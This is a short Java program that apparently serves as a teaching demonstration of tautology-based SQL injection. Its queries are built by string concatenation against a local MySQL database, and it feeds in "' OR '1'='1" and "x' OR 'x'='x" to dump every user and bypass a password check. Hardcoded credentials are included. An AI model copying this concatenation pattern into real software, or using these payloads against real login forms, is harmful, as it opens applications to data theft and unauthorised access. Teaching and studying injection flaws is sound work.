// Tautology-Based SQL Injection via JDBC
// Attacker injects an always-true condition to bypass authentication or filters.

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;

public class tautology_injection {
    public static void main(String[] args) throws Exception {
        String url = "jdbc:mysql://localhost:3306/database_name";
        String username = "rootgfg";
        String password = "gfg123";

        Class.forName("com.mysql.cj.jdbc.Driver");
        Connection con = DriverManager.getConnection(url, username, password);
        Statement st = con.createStatement();

        // VULNERABLE: '1'='1' is always true, returns every row
        String input = "' OR '1'='1";
        String query = "SELECT * FROM users WHERE username = '" + input + "'";

        ResultSet rs = st.executeQuery(query);
        while (rs.next()) {
            System.out.println("Tautology match: " + rs.getString("username"));
        }

        // Password bypass with OR 1=1
        String pass = "x' OR 'x'='x";
        String loginQuery = "SELECT * FROM users WHERE password = '" + pass + "'";
        ResultSet lrs = st.executeQuery(loginQuery);
        System.out.println(lrs.next() ? "Authentication bypassed (OR 1=1)" : "No bypass");

        rs.close();
        lrs.close();
        st.close();
        con.close();
    }
}
